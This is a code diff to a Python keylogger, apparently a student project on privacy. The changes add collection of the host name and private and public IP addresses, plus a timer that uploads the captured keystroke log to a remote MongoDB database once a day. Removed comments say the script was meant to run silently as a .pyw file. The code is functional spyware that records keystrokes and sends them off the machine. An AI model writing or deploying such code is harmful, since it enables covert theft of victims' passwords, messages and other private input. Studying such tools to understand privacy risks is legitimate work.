@@ -7,15 +7,19 @@
 # The purpose was to test to see how easy it can be to create
 # a piece of software that is potentially dangerous in invading
 # privacy, since privacy is a big topic in Computers and Society
-# The file format of this is .pyw. The .pyw extension allows for 
-# the python program to run silently in the background.
 
 # library
 from pynput.keyboard import Key, Listener
+from pymongo import MongoClient
 # vanilla
 import logging
 # import socket so I can get host name and ip address
 import socket
+import ipgetter
+# import threading for a set interval
+import threading
+# for date and time
+import datetime
 
 # if no name for directory, it gets put into an empty string
  #make a log file
@@ -23,6 +27,7 @@ log_dir = ""
 # variables to store IP address and host name if not available
 host_name = "N/A"
 host_ip = "N/A"
+external_ip = "N/A"
 
 # this is a function from the 
 # sets file to log to with file name and path
@@ -30,25 +35,57 @@ host_ip = "N/A"
 # formats messages and keylogs in ascending time order
 logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format = '%(asctime)s: %(message)s:')
 
+def writeFile(host_name, host_ip, external_ip):
+    with open(log_dir + "key_log.txt", "a") as myfile:
+            myfile.write("Hostname: " + host_name + "\n")
+            myfile.write("Private IP: " + host_ip + "\n")
+            myfile.write("Public IP: " + external_ip + "\n")
+
 # Function to display hostname and 
 # IP address 
 def get_Host_name_IP(): 
     try: 
         host_name = socket.gethostname() 
-        host_ip = socket.gethostbyname(host_name) 
+        host_ip = socket.gethostbyname(host_name)
+        external_ip = ipgetter.myip()
         print("Hostname:", host_name) 
-        print("IP:", host_ip) 
-        with open(log_dir + "key_log.txt", "a") as myfile:
-            myfile.write("HOST NAME: " + host_name + "\n")
-            myfile.write("IP ADDRESS: " + host_ip + "\n")
+        print("Private IP:", host_ip)
+        print("Public IP:", external_ip) 
+        writeFile(host_name, host_ip, external_ip)
     except: 
         print("Unable to get Hostname and IP") 
-        with open(log_dir + "key_log.txt", "a") as myfile:
-            myfile.write("HOST NAME: " + host_name + "\n")
-            myfile.write("IP ADDRESS: " + host_ip + "\n")
-  
+        writeFile(host_name, host_ip, external_ip)
+
 # Driver code 
 get_Host_name_IP() # Function call 
+
+def set_interval(func, sec):
+    def func_wrapper():
+        set_interval(func, sec)
+        func()
+    t = threading.Timer(sec, func_wrapper)
+    t.start()
+    return t
+
+uri = "MONGODB_URI" # I use mlab
+
+client = MongoClient(uri,
+        connectTimeoutMS=30000,
+        socketTimeoutMS=None)
+
+db = client.get_database()
+logs = db.logs
+
+def uploadFile():
+    # get_Host_name_IP()
+    f = open(log_dir + "key_log.txt")
+    text = f.read()
+    doc = {
+    "file_name": datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S") + " Log.txt",
+    "contents" : text }
+    logs.insert_one(doc)
+
+timer = set_interval(uploadFile, 86400)
 
 # this is from the library
 def on_press(key):
